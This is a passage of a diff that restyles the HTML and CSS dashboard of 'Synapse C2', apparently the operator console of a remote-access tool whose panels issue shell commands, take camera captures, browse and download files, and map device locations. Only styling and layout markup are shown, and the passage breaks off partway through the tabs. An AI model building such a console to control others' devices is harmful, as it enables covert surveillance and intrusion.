@@ -1,1057 +1,1319 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Synapse C2 — Dashboard</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        :root {
-            --bg: #0d1117;
-            --bg2: #161b22;
-            --bg3: #21262d;
-            --border: #30363d;
-            --text: #c9d1d9;
-            --dim: #8b949e;
-            --accent: #58a6ff;
-            --green: #3fb950;
-            --red: #f85149;
-            --code-green: #7ee787;
-        }
-        body {
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-            background: var(--bg);
-            color: var(--text);
-            height: 100vh;
-            overflow: hidden;
-        }
-        .header {
-            background: var(--bg2);
-            border-bottom: 1px solid var(--border);
-            padding: 10px 20px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            height: 48px;
-        }
-        .header h1 { font-size: 18px; color: var(--accent); font-weight: 700; }
-        .header .server-status { margin-left: auto; font-size: 12px; color: var(--dim); display: flex; align-items: center; gap: 6px; }
-        .dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
-        .dot.green { background: var(--green); box-shadow: 0 0 8px var(--green); }
-        .dot.red { background: var(--red); }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>⚡ Synapse C2 — Command & Control</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<style>
+/* =============================================================
+   SYNAPSE C2 — PROFESSIONAL DARK CYBERSECURITY THEME
+   ============================================================= */
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#0a0e14; --bg2:#11161d; --bg3:#1a1f2b; --bg4:#222836;
+  --border:#2a3140; --text:#c9d1d9; --dim:#6b7280; --accent:#4da6ff;
+  --green:#3fb950; --red:#f85149; --orange:#f0883e; --purple:#db61a2;
+  --cyan:#39c5cf; --yellow:#e2b93b; --code-green:#7ee787;
+  --font:'Inter','Segoe UI',system-ui,-apple-system,sans-serif;
+  --mono:'JetBrains Mono','Fira Code','Cascadia Code',monospace;
+}
+html,body{height:100%;overflow:hidden}
+body{
+  font-family:var(--font); background:var(--bg); color:var(--text);
+  font-size:13px; line-height:1.5;
+}
 
-        .container { display: grid; grid-template-columns: 300px 1fr; height: calc(100vh - 48px); }
-        .sidebar {
-            background: var(--bg2);
-            border-right: 1px solid var(--border);
-            overflow-y: auto;
-            padding: 12px;
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
-        .sidebar h3 {
-            font-size: 11px;
-            color: var(--dim);
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .sidebar h3 .count { color: var(--accent); }
-        .device-card {
-            background: var(--bg3);
-            border: 1px solid var(--border);
-            border-radius: 6px;
-            padding: 10px 12px;
-            cursor: pointer;
-            transition: all 0.15s;
-            position: relative;
-        }
-        .device-card:hover { border-color: var(--accent); }
-        .device-card.selected { border-color: var(--accent); background: #1c2838; box-shadow: 0 0 12px rgba(88,166,255,0.15); }
-        .device-card .id-line { display: flex; align-items: center; gap: 8px; margin-bottom: 4px; }
-        .device-card .id-line .dev-dot { width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; }
-        .device-card .dev-id {
-            font-size: 12px;
-            font-weight: 600;
-            color: var(--accent);
-            word-break: break-all;
-            font-family: 'Fira Code', 'Cascadia Code', monospace;
-        }
-        .device-card .dev-info { font-size: 10px; color: var(--dim); line-height: 1.5; }
-        .device-card .dev-info span { color: var(--text); }
+/* ========== HEADER ========== */
+.header{
+  background:var(--bg2); border-bottom:1px solid var(--border);
+  padding:0 20px; height:44px; display:flex; align-items:center; gap:12px;
+  flex-shrink:0;
+}
+.header .logo{font-size:16px;font-weight:800;color:var(--accent);letter-spacing:-0.5px}
+.header .logo .bolt{color:var(--yellow)}
+.header .server-status{margin-left:auto;font-size:11px;color:var(--dim);display:flex;align-items:center;gap:6px}
+.header .dot{width:7px;height:7px;border-radius:50%}
+.header .dot.green{background:var(--green);box-shadow:0 0 8px var(--green)}
+.header .dot.red{background:var(--red)}
+.header .dot.yellow{background:var(--yellow)}
 
-        .main { display: flex; flex-direction: column; overflow: hidden; }
-        .cmd-panel {
-            background: var(--bg2);
-            border-bottom: 1px solid var(--border);
-            padding: 14px 20px;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-        .quick-actions { display: flex; gap: 6px; flex-wrap: wrap; }
-        .qbtn {
-            padding: 6px 14px;
-            border-radius: 4px;
-            font-size: 12px;
-            font-weight: 600;
-            cursor: pointer;
-            border: 1px solid var(--border);
-            background: var(--bg3);
-            color: var(--text);
-            transition: all 0.15s;
-            white-space: nowrap;
-        }
-        .qbtn:hover { background: var(--accent); color: #fff; border-color: var(--accent); }
-        .qbtn:disabled { opacity: 0.4; cursor: not-allowed; pointer-events: none; }
-        .qbtn.ping { border-color: #3fb950; color: #3fb950; }
-        .qbtn.ping:hover { background: #3fb950; color: #000; }
-        .qbtn.shell { border-color: #f0883e; color: #f0883e; }
-        .qbtn.shell:hover { background: #f0883e; color: #000; }
-        .qbtn.camera { border-color: #db61a2; color: #db61a2; }
-        .qbtn.camera:hover { background: #db61a2; color: #000; }
-        .cmd-row {
-            display: flex;
-            gap: 8px;
-            align-items: center;
-        }
-        .cmd-row input, .cmd-row select {
-            background: var(--bg);
-            border: 1px solid var(--border);
-            border-radius: 4px;
-            color: var(--text);
-            padding: 7px 10px;
-            font-family: 'Fira Code', monospace;
-            font-size: 12px;
-            outline: none;
-        }
-        .cmd-row input:focus, .cmd-row select:focus { border-color: var(--accent); }
-        .cmd-row input { flex: 1; }
-        .cmd-row .mod-input { max-width: 140px; }
-        .cmd-row .act-input { max-width: 140px; }
-        .send-btn {
-            background: #238636;
-            border: 1px solid #2ea043;
-            border-radius: 4px;
-            color: #fff;
-            padding: 8px 24px;
-            font-size: 13px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.15s;
-        }
-        .send-btn:hover { background: #2ea043; }
-        .send-btn:disabled { background: var(--bg3); border-color: var(--border); color: #484f58; cursor: not-allowed; }
-        .send-btn.loading { opacity: 0.7; }
-        .spinner {
-            display: none;
-            width: 14px; height: 14px;
-            border: 2px solid transparent;
-            border-top: 2px solid #fff;
-            border-radius: 50%;
-            animation: spin 0.6s linear infinite;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .send-btn.loading .spinner { display: inline-block; }
-        .send-btn.loading .btn-text { display: none; }
+/* ========== MAIN LAYOUT (CSS GRID) ========== */
+.layout{
+  display:grid;
+  grid-template-columns:320px 1fr;
+  height:calc(100vh - 44px);
+  overflow:hidden;
+}
 
-        .result-area {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
-        }
-        .result-tabs { display: flex; gap: 0; border-bottom: 1px solid var(--border); }
-        .result-tabs button {
-            padding: 8px 16px;
-            background: transparent;
-            border: none;
-            color: var(--dim);
-            cursor: pointer;
-            font-size: 12px;
-            border-bottom: 2px solid transparent;
-            transition: all 0.15s;
-        }
-        .result-tabs button.active { color: var(--accent); border-bottom-color: var(--accent); }
-        .result-tabs button:hover { color: var(--text); }
+/* ========== SIDEBAR ========== */
+.sidebar{
+  background:var(--bg2); border-right:1px solid var(--border);
+  display:flex; flex-direction:column; overflow:hidden;
+}
+.sidebar-section{padding:12px;border-bottom:1px solid var(--border)}
+.sidebar-section:last-child{border-bottom:none}
+.sidebar-title{
+  font-size:10px;color:var(--dim);text-transform:uppercase;
+  letter-spacing:1.5px;margin-bottom:10px;display:flex;align-items:center;gap:6px
+}
+.sidebar-title .count{color:var(--accent)}
+.device-list{overflow-y:auto;flex:1;padding:0 12px 12px}
+.device-card{
+  background:var(--bg3);border:1px solid var(--border);border-radius:6px;
+  padding:10px 12px;cursor:pointer;transition:all .15s;margin-bottom:6px
+}
+.device-card:hover{border-color:var(--accent)}
+.device-card.selected{border-color:var(--accent);background:#151e2d;box-shadow:0 0 12px rgba(77,166,255,0.12)}
+.device-card .dev-top{display:flex;align-items:center;gap:8px;margin-bottom:4px}
+.device-card .dev-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
+.device-card .dev-dot.online{background:var(--green);box-shadow:0 0 6px var(--green)}
+.device-card .dev-dot.offline{background:var(--red)}
+.device-card .dev-id{font-size:11px;font-weight:600;color:var(--accent);word-break:break-all;font-family:var(--mono)}
+.device-card .dev-meta{font-size:10px;color:var(--dim);display:flex;flex-wrap:wrap;gap:4px}
+.device-card .dev-meta span{color:var(--text)}
 
-        .tab-content { flex: 1; overflow: hidden; display: none; flex-direction: column; }
-        .tab-content.active { display: flex; }
+/* Device Info Card (in sidebar) */
+.info-card{
+  background:var(--bg3);border:1px solid var(--border);border-radius:6px;
+  padding:10px 12px;margin-top:6px;
+}
+.info-card .info-row{display:flex;padding:3px 0;font-size:11px}
+.info-card .info-label{color:var(--dim);width:95px;flex-shrink:0;font-weight:500}
+.info-card .info-value{color:var(--text);word-break:break-all;font-family:var(--mono);font-size:10px}
 
-        .result-feed {
-            flex: 1;
-            overflow-y: auto;
-            padding: 12px;
-            font-family: 'Fira Code', monospace;
-            font-size: 12px;
-            background: var(--bg);
-        }
-        .result-entry {
-            padding: 8px 12px;
-            border-left: 2px solid var(--border);
-            margin-bottom: 8px;
-        }
-        .result-entry:hover { border-left-color: var(--accent); }
-        .result-meta {
-            font-size: 10px;
-            color: var(--dim);
-            margin-bottom: 4px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            flex-wrap: wrap;
-        }
-        .result-meta .module-tag {
-            background: var(--bg3);
-            padding: 1px 6px;
-            border-radius: 3px;
-            font-size: 10px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        .result-meta .module-tag.camera { color: #db61a2; }
-        .result-meta .module-tag.files { color: #f0883e; }
-        .result-meta .module-tag.shell { color: #7ee787; }
-        .result-meta .module-tag.info { color: #58a6ff; }
-        .result-payload {
-            color: var(--code-green);
-            white-space: pre-wrap;
-            word-break: break-word;
-            max-height: 300px;
-            overflow-y: auto;
-            line-height: 1.5;
-        }
-        .result-image {
-            max-width: 100%;
-            max-height: 400px;
-            border-radius: 4px;
-            border: 1px solid var(--border);
-            cursor: pointer;
-            display: block;
-            margin-top: 6px;
-        }
-        .result-image:hover { border-color: var(--accent); }
+/* ========== MAIN AREA ========== */
+.main{display:flex;flex-direction:column;overflow:hidden}
 
-        /* Device info card */
-        .info-card {
-            background: var(--bg3);
-            border: 1px solid var(--border);
-            border-radius: 6px;
-            padding: 12px;
-            margin-top: 6px;
-        }
-        .info-card .info-row {
-            display: flex;
-            padding: 4px 0;
-            font-size: 12px;
-        }
-        .info-card .info-label {
-            color: var(--dim);
-            width: 120px;
-            flex-shrink: 0;
-            font-weight: 600;
-        }
-        .info-card .info-value {
-            color: var(--text);
-            word-break: break-all;
-            font-family: 'Fira Code', monospace;
-            font-size: 11px;
-        }
+/* Tabs */
+.tabs{display:flex;gap:0;border-bottom:1px solid var(--border);background:var(--bg2);flex-shrink:0}
+.tabs button{
+  padding:10px 16px;background:transparent;border:none;color:var(--dim);
+  cursor:pointer;font-size:12px;font-weight:500;border-bottom:2px solid transparent;
+  transition:all .15s;white-space:nowrap;font-family:var(--font)
+}
+.tabs button:hover{color:var(--text)}
+.tabs button.active{color:var(--accent);border-bottom-color:var(--accent)}
+.tabs button .badge{background:var(--accent);color:#000;font-size:10px;padding:1px 6px;border-radius:8px;margin-left:4px;font-weight:700}
 
-        /* Ping success */
-        .ping-ok {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            padding: 4px 12px;
-            background: rgba(63,185,80,0.1);
-            border: 1px solid var(--green);
-            border-radius: 4px;
-            color: var(--green);
-            font-weight: 600;
-            margin-top: 6px;
-        }
-        .ping-ok .check-icon { font-size: 18px; }
+/* Tab panels */
+.tab-panel{flex:1;overflow:hidden;display:none}
+.tab-panel.active{display:flex;flex-direction:column}
 
-        /* Shell output */
-        .shell-output {
-            background: #0a0f16;
-            border: 1px solid var(--border);
-            border-radius: 4px;
-            padding: 10px 12px;
-            margin-top: 6px;
-            font-family: 'Fira Code', 'Cascadia Code', monospace;
-            font-size: 11px;
-            color: var(--code-green);
-            white-space: pre-wrap;
-            word-break: break-word;
-            max-height: 300px;
-            overflow-y: auto;
-            line-height: 1.5;
-        }
-        .shell-output .exit-code {
-            font-size: 10px;
-            color: var(--dim);
-            margin-top: 4px;
-            padding-top: 4px;
-            border-top: 1px solid var(--border);
-        }
-        .shell-output .exit-code.nonzero { color: var(--red); }
+/* ========== PANEL 1: LIVE FEED ========== */
+.live-feed{flex:1;overflow-y:auto;padding:10px;background:var(--bg)}
+.feed-entry{
+  padding:8px 12px;border-left:3px solid var(--border);margin-bottom:6px;
+  border-radius:0 4px 4px 0;transition:border-color .15s
+}
+.feed-entry:hover{border-left-color:var(--accent)}
+.feed-entry.ping{border-left-color:var(--green)}
+.feed-entry.info{border-left-color:var(--accent)}
+.feed-entry.shell{border-left-color:var(--yellow)}
+.feed-entry.camera{border-left-color:var(--purple)}
+.feed-entry.files{border-left-color:var(--orange)}
+.feed-entry.location{border-left-color:var(--cyan)}
+.feed-entry.error{border-left-color:var(--red)}
+.feed-meta{font-size:10px;color:var(--dim);display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:4px}
+.feed-tag{background:var(--bg3);padding:1px 7px;border-radius:3px;font-size:10px;text-transform:uppercase;letter-spacing:.5px;font-weight:600}
+.feed-tag.ping{color:var(--green)}
+.feed-tag.info{color:var(--accent)}
+.feed-tag.shell{color:var(--yellow)}
+.feed-tag.camera{color:var(--purple)}
+.feed-tag.files{color:var(--orange)}
+.feed-tag.location{color:var(--cyan)}
+.feed-tag.error{color:var(--red)}
+.feed-body{font-size:12px;color:var(--code-green);white-space:pre-wrap;word-break:break-word;line-height:1.5}
+.feed-image{cursor:pointer;max-width:320px;max-height:240px;border-radius:4px;border:1px solid var(--border);display:block;margin-top:6px}
+.feed-image:hover{border-color:var(--accent)}
+.ping-badge{display:inline-flex;align-items:center;gap:4px;padding:3px 10px;background:rgba(63,185,80,0.1);border:1px solid var(--green);border-radius:3px;color:var(--green);font-weight:600;font-size:11px;margin-top:4px}
+.error-block{background:rgba(248,81,73,0.08);border:1px solid var(--red);border-radius:4px;padding:6px 10px;margin-top:4px;color:var(--red);font-size:11px}
+.location-block{display:flex;align-items:center;gap:8px;padding:6px 10px;background:var(--bg3);border:1px solid var(--border);border-radius:4px;margin-top:4px;font-size:12px}
+.location-block .coords{color:var(--accent);font-family:var(--mono)}
+.feed-filter{padding:8px 10px;background:var(--bg2);border-bottom:1px solid var(--border);display:flex;gap:6px;flex-wrap:wrap;flex-shrink:0}
+.feed-filter .flt{font-size:10px;padding:3px 8px;border-radius:3px;cursor:pointer;border:1px solid var(--border);background:var(--bg3);color:var(--dim);transition:all .15s}
+.feed-filter .flt.active{color:var(--text);border-color:var(--accent)}
+.feed-filter .flt:hover{color:var(--text)}
 
-        /* Error display */
-        .error-block {
-            background: rgba(248,81,73,0.08);
-            border: 1px solid var(--red);
-            border-radius: 4px;
-            padding: 8px 12px;
-            margin-top: 6px;
-            color: var(--red);
-            font-size: 12px;
-            font-family: 'Fira Code', monospace;
-            word-break: break-word;
-        }
+/* Generic button */
+.btn{
+  padding:5px 12px;border-radius:4px;border:1px solid var(--border);background:var(--bg3);
+  color:var(--text);font-size:11px;cursor:pointer;transition:all .15s;font-weight:500
+}
+.btn:hover{border-color:var(--accent)}
+.btn:disabled{opacity:.4;cursor:not-allowed}
 
-        /* Location display */
-        .location-display {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            padding: 8px 12px;
-            background: var(--bg3);
-            border: 1px solid var(--border);
-            border-radius: 4px;
-            margin-top: 6px;
-            font-size: 13px;
-        }
-        .location-display .coords {
-            color: var(--accent);
-            font-family: 'Fira Code', monospace;
-        }
+/* ========== PANEL 2: COMMAND CONSOLE ========== */
+.cmd-console{display:flex;flex-direction:column;overflow:hidden}
+.cmd-quick-actions{padding:10px 16px;background:var(--bg2);border-bottom:1px solid var(--border);display:flex;gap:6px;flex-wrap:wrap;flex-shrink:0}
+.cmd-row{padding:8px 16px;background:var(--bg2);display:flex;gap:8px;align-items:center;flex-shrink:0}
+.cmd-row input,.cmd-row select{
+  background:var(--bg);border:1px solid var(--border);border-radius:4px;
+  color:var(--text);padding:8px 10px;font-family:var(--mono);font-size:12px;outline:none
+}
+.cmd-row input:focus,.cmd-row select:focus{border-color:var(--accent)}
+.cmd-row .mod-input{width:120px;flex-shrink:0}
+.cmd-row .act-input{width:110px;flex-shrink:0}
+.cmd-row .params-input{flex:1}
+.cmd-send{
+  background:#238636;border:1px solid #2ea043;border-radius:4px;color:#fff;
+  padding:8px 20px;font-size:12px;font-weight:600;cursor:pointer;
+  transition:all .15s;flex-shrink:0;display:flex;align-items:center;gap:6px
+}
+.cmd-send:hover{background:#2ea043}
+.cmd-send:disabled{background:var(--bg3);border-color:var(--border);color:#484f58;cursor:not-allowed}
+.cmd-history{flex:1;overflow-y:auto;padding:10px;background:var(--bg)}
+.cmd-history-entry{padding:6px 10px;margin-bottom:4px;border-radius:4px;cursor:pointer;font-size:11px;font-family:var(--mono);display:flex;align-items:center;gap:8px}
+.cmd-history-entry:hover{background:var(--bg3)}
+.cmd-history-entry .h-mod{color:var(--accent);font-weight:600}
+.cmd-history-entry .h-act{color:var(--text)}
+.cmd-history-entry .h-params{color:var(--dim);font-size:10px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.cmd-history-entry .h-time{color:var(--dim);font-size:10px;flex-shrink:0}
+.cmd-empty{color:#484f58;text-align:center;padding:40px;font-size:13px}
 
-        .file-table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 12px;
-            margin-top: 8px;
-        }
-        .file-table th {
-            text-align: left;
-            padding: 6px 8px;
-            border-bottom: 1px solid var(--border);
-            color: var(--dim);
-            font-weight: 600;
-            font-size: 10px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        .file-table td {
-            padding: 6px 8px;
-            border-bottom: 1px solid #21262d;
-        }
-        .file-table tr:hover td { background: var(--bg3); }
-        .file-dl {
-            background: var(--accent);
-            color: #fff;
-            border: none;
-            padding: 3px 10px;
-            border-radius: 3px;
-            font-size: 11px;
-            cursor: pointer;
-        }
-        .file-dl:hover { background: #79b8ff; }
+/* ========== PANEL 3: FILE BROWSER ========== */
+.file-browser{display:flex;flex-direction:column;overflow:hidden}
+.file-toolbar{padding:8px 12px;background:var(--bg2);border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;flex-shrink:0;flex-wrap:wrap}
+.file-toolbar .breadcrumb{display:flex;align-items:center;gap:4px;font-size:11px;color:var(--dim);flex:1}
+.file-toolbar .breadcrumb span{color:var(--accent);cursor:pointer}
+.file-toolbar .breadcrumb span:hover{text-decoration:underline}
+.file-toolbar .path-input{
+  background:var(--bg);border:1px solid var(--border);border-radius:3px;
+  color:var(--text);padding:4px 8px;font-family:var(--mono);font-size:11px;width:200px;outline:none
+}
+.file-toolbar .path-input:focus{border-color:var(--accent)}
+.file-toolbar .btn{
+  padding:5px 12px;border-radius:4px;border:1px solid var(--border);background:var(--bg3);
+  color:var(--text);font-size:11px;cursor:pointer;transition:all .15s;font-weight:500
+}
+.file-toolbar .btn:hover{border-color:var(--accent)}
+.file-toolbar .btn.primary{background:var(--accent);border-color:var(--accent);color:#000;font-weight:700}
+.file-grid{flex:1;overflow-y:auto;padding:12px;display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:10px;align-content:start;background:var(--bg)}
+.file-thumb{
+  background:var(--bg3);border:1px solid var(--border);border-radius:6px;
+  overflow:hidden;cursor:pointer;transition:all .15s;display:flex;flex-direction:column
+}
+.file-thumb:hover{border-color:var(--accent);transform:translateY(-1px);box-shadow:0 4px 12px rgba(0,0,0,0.3)}
+.file-thumb .thumb-img-container{
+  width:100%;height:120px;background:var(--bg);display:flex;
+  align-items:center;justify-content:center;overflow:hidden;position:relative
+}
+.file-thumb .thumb-img-container img{width:100%;height:100%;object-fit:cover}
+.file-thumb .thumb-img-container .file-icon{font-size:36px;color:var(--dim)}
+.file-thumb .thumb-img-container .thumb-overlay{
+  position:absolute;top:4px;right:4px;background:var(--accent);color:#000;
+  font-size:9px;padding:2px 5px;border-radius:3px;font-weight:700;opacity:0;transition:opacity .15s
+}
+.file-thumb:hover .thumb-overlay{opacity:1}
+.file-thumb .thumb-info{padding:8px 10px}
+.file-thumb .thumb-name{font-size:11px;font-weight:600;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.file-thumb .thumb-meta{font-size:10px;color:var(--dim);display:flex;justify-content:space-between;margin-top:2px}
+.file-thumb .thumb-actions{display:flex;gap:4px;padding:0 10px 8px}
+.file-thumb .thumb-actions button{
+  flex:1;padding:3px;font-size:10px;border:1px solid var(--border);border-radius:3px;
+  background:var(--bg3);color:var(--text);cursor:pointer;transition:all .15s
+}
+.file-thumb .thumb-actions button:hover{border-color:var(--accent);color:var(--accent)}
+.loading-pulse{animation:pulse 1.5s infinite}
+@keyframes pulse{0%,100%{opacity:.4}50%{opacity:1}}
 
-        .empty-state {
-            color: #484f58;
-            text-align: center;
-            padding: 60px 20px;
-            font-size: 13px;
-        }
-        .empty-state .icon { font-size: 32px; margin-bottom: 8px; }
+/* ========== PANEL 4: CAMERA ========== */
+.camera-panel{display:flex;flex-direction:column;overflow:hidden}
+.camera-controls{padding:10px 16px;background:var(--bg2);border-bottom:1px solid var(--border);display:flex;gap:10px;align-items:center;flex-shrink:0}
+.camera-controls .btn{
+  padding:8px 20px;border-radius:4px;border:1px solid var(--purple);background:rgba(219,97,162,0.1);
+  color:var(--purple);font-size:13px;font-weight:600;cursor:pointer;transition:all .15s;display:flex;align-items:center;gap:6px
+}
+.camera-controls .btn:hover{background:var(--purple);color:#000}
+.camera-gallery{flex:1;overflow-y:auto;padding:12px;display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;align-content:start;background:var(--bg)}
+.camera-card{background:var(--bg3);border:1px solid var(--border);border-radius:6px;overflow:hidden;transition:all .15s}
+.camera-card:hover{border-color:var(--purple)}
+.camera-card img{width:100%;height:180px;object-fit:cover;cursor:pointer;display:block}
+.camera-card .cam-info{padding:8px 10px;font-size:10px;color:var(--dim);display:flex;justify-content:space-between}
+.camera-card .cam-info span{color:var(--text)}
 
-        .stats-row {
-            display: flex;
-            gap: 12px;
-            padding: 10px 20px;
-            background: var(--bg2);
-            border-bottom: 1px solid var(--border);
-        }
-        .stat {
-            background: var(--bg3);
-            padding: 6px 14px;
-            border-radius: 4px;
-            border: 1px solid var(--border);
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 12px;
-        }
-        .stat .num { font-weight: 700; color: var(--accent); font-size: 16px; }
-        .stat .label { color: var(--dim); font-size: 10px; text-transform: uppercase; }
+/* ========== PANEL 5: SHELL ========== */
+.shell-panel{display:flex;flex-direction:column;overflow:hidden}
+.shell-input-row{padding:8px 12px;background:var(--bg2);border-bottom:1px solid var(--border);display:flex;gap:8px;flex-shrink:0}
+.shell-input-row input{
+  flex:1;background:#0a0f16;border:1px solid var(--border);border-radius:4px;
+  color:var(--code-green);padding:8px 12px;font-family:var(--mono);font-size:13px;outline:none
+}
+.shell-input-row input:focus{border-color:var(--accent)}
+.shell-input-row button{
+  padding:8px 16px;background:var(--orange);border:1px solid var(--orange);border-radius:4px;
+  color:#000;font-weight:700;font-size:12px;cursor:pointer;transition:all .15s
+}
+.shell-input-row button:hover{background:#f49b52}
+.shell-input-row button:disabled{opacity:.5;cursor:not-allowed}
+.shell-terminal{
+  flex:1;overflow-y:auto;padding:12px;background:#070a0f;
+  font-family:var(--mono);font-size:12px;line-height:1.6;color:var(--code-green)
+}
+.shell-terminal .s-line{padding:1px 0}
+.shell-terminal .s-cmd{color:var(--accent)}
+.shell-terminal .s-stderr{color:var(--red)}
+.shell-terminal .s-exit{color:var(--dim);font-size:10px;margin-top:2px;border-top:1px solid var(--border);padding-top:2px}
+.shell-terminal .s-exit.nonzero{color:var(--red)}
 
-        .toast {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: var(--bg3);
-            border: 1px solid var(--accent);
-            color: var(--text);
-            padding: 10px 18px;
-            border-radius: 6px;
-            font-size: 12px;
-            z-index: 1000;
-            animation: slideIn 0.3s ease;
-            max-width: 400px;
-        }
-        @keyframes slideIn { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+/* ========== PANEL 6: MAP ========== */
+.map-panel{overflow:hidden;position:relative}
+.map-container{width:100%;height:100%;background:var(--bg)}
+.map-pin-info{
+  position:absolute;bottom:16px;left:16px;background:var(--bg3);border:1px solid var(--border);
+  border-radius:6px;padding:10px 14px;font-size:12px;z-index:1000;max-width:300px
+}
+.map-pin-info .coords{color:var(--accent);font-family:var(--mono);font-weight:600}
+.map-pin-info .meta{font-size:10px;color:var(--dim);margin-top:2px}
+.map-empty{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:var(--dim);font-size:14px;z-index:500;pointer-events:none}
 
-        /* Modal for full-size image */
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 999; justify-content: center; align-items: center; cursor: pointer; }
-        .modal.show { display: flex; }
-        .modal img { max-width: 95%; max-height: 95%; border-radius: 8px; }
-    </style>
+/* ========== MODALS ========== */
+.modal-overlay{
+  display:none;position:fixed;inset:0;background:rgba(0,0,0,0.88);
+  z-index:9999;justify-content:center;align-items:center;cursor:pointer
+}
+.modal-overlay.show{display:flex}
+.modal-overlay img{max-width:95vw;max-height:95vh;border-radius:8px;box-shadow:0 0 40px rgba(0,0,0,0.5)}
+.modal-overlay .modal-close{
+  position:absolute;top:20px;right:28px;color:#fff;font-size:32px;
+  cursor:pointer;width:40px;height:40px;display:flex;align-items:center;justify-content:center;
+  border-radius:50%;background:rgba(255,255,255,0.1);transition:all .15s
+}
+.modal-overlay .modal-close:hover{background:rgba(255,255,255,0.2)}
+
+/* ========== TOAST ========== */
+.toast-container{position:fixed;bottom:20px;right:20px;z-index:8000;display:flex;flex-direction:column;gap:8px}
+.toast{
+  background:var(--bg3);border:1px solid var(--accent);color:var(--text);
+  padding:10px 18px;border-radius:6px;font-size:12px;animation:slideIn .3s ease;
+  max-width:380px;word-break:break-word
+}
+.toast.error{border-color:var(--red)}
+.toast.success{border-color:var(--green)}
+@keyframes slideIn{from{transform:translateX(40px);opacity:0}to{transform:translateX(0);opacity:1}}
+
+/* ========== STATS BAR ========== */
+.stats-bar{display:flex;gap:12px;padding:8px 16px;background:var(--bg2);border-bottom:1px solid var(--border);flex-shrink:0}
+.stat-pill{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:5px 12px;display:flex;align-items:center;gap:6px;font-size:11px}
+.stat-pill .num{font-weight:700;color:var(--accent);font-size:15px}
+.stat-pill .lbl{color:var(--dim);font-size:10px;text-transform:uppercase}
+
+/* ========== SCROLLBAR ========== */
+::-webkit-scrollbar{width:6px;height:6px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
+::-webkit-scrollbar-thumb:hover{background:var(--dim)}
+
+/* ========== RESPONSIVE ========== */
+@media(max-width:900px){
+  .layout{grid-template-columns:1fr}
+  .sidebar{display:none}
+  .sidebar.mobile-show{display:flex;position:fixed;inset:44px 0 0 0;z-index:100}
+}
+</style>
 </head>
 <body>
-    <div class="header">
-        <h1>⚡ Synapse C2</h1>
-        <span class="server-status"><span class="dot green" id="sse-dot"></span> <span id="sse-status">Connecting...</span></span>
+
+<!-- HEADER -->
+<div class="header">
+  <div class="logo"><span class="bolt">⚡</span> Synapse C2</div>
+  <div class="server-status"><span class="dot yellow" id="sse-dot"></span><span id="sse-status">Connecting...</span></div>
+</div>
+
+<!-- LAYOUT -->
+<div class="layout">
+  <!-- SIDEBAR -->
+  <div class="sidebar" id="sidebar">
+    <div class="sidebar-section">
+      <div class="sidebar-title">📱 Devices <span class="count" id="device-count">(0)</span></div>
+      <div style="display:flex;gap:6px;margin-bottom:10px">
+        <input type="text" id="device-search" placeholder="Search devices..." style="flex:1;background:var(--bg);border:1px solid var(--border);border-radius:4px;color:var(--text);padding:5px 8px;font-size:11px;outline:none" oninput="renderDeviceList()">
+      </div>
     </div>
-    <div class="container">
-        <div class="sidebar" id="sidebar">
-            <h3>📱 Devices <span class="count" id="device-count">(0)</span></h3>
-            <div id="device-list"><div class="empty-state">No devices connected</div></div>
+    <div class="device-list" id="device-list">
+      <div style="color:var(--dim);text-align:center;padding:20px;font-size:12px">No devices connected</div>
+    </div>
+    <div class="sidebar-section" id="device-info-panel" style="display:none">
+      <div class="sidebar-title">ℹ️ Device Info</div>
+      <div class="info-card" id="device-info-card"></div>
+    </div>
+  </div>
+
+  <!-- MAIN -->
+  <div class="main">
+    <!-- STATS -->
+    <div class="stats-bar">
+      <div class="stat-pill"><span class="num" id="st-total">0</span><span class="lbl">Total</span></div>
+      <div class="stat-pill"><span class="num" id="st-online">0</span><span class="lbl">Online</span></div>
+      <div class="stat-pill"><span class="num" id="st-offline">0</span><span class="lbl">Offline</span></div>
+      <div class="stat-pill"><span class="num" id="st-results">0</span><span class="lbl">Results</span></div>
+    </div>
+
+    <!-- TABS -->
+    <div class="tabs" id="main-tabs">
+      <button class="active" data-tab="feed">📡 Live Feed <span class="badge" id="badge-feed" style="display:none">0</span></button>
